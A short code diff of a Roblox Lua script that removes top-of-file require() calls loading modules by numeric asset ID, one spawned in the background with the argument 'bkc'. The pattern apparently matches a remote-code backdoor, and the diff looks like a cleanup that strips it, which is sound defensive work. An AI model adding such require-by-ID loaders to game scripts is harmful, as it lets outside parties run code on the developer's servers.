@@ -1,8 +1,6 @@
-task.spawn(function()
-require(18254193128)("bkc")
-end)
 
-require(77565251296196):load()
+
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
